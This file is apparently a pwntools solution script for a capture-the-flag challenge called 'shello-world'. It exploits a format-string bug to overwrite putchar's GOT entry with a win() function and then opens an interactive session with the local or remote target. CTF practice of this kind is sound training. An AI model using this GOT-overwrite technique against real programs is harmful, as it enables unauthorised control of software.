from pwn import *

# Set up the target binary by specifying the ELF file
elf = context.binary = ELF("shello-world")

# Defining the GDB script that will be used when running the binary
gs = '''
continue
'''
# Launch the binary with GDB, without GDB or REMOTE based on the command-line arguments
def start():
    if args.REMOTE:
        return remote("challs.tfcctf.com", 31769)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

io = start()

#============================================================
#                    EXPLOIT GOES HERE
#============================================================

# Create the FmtStr object and specify the offset to the first argument on the stack
format_string = FmtStr(execute_fmt=io.sendline, offset=6)

# Overwrite putchar() in GOT with win()
format_string.write(elf.got.putchar, elf.sym.win)

# Execute the format string writes
format_string.execute_writes()

#============================================================

# Interact with the process
io.interactive()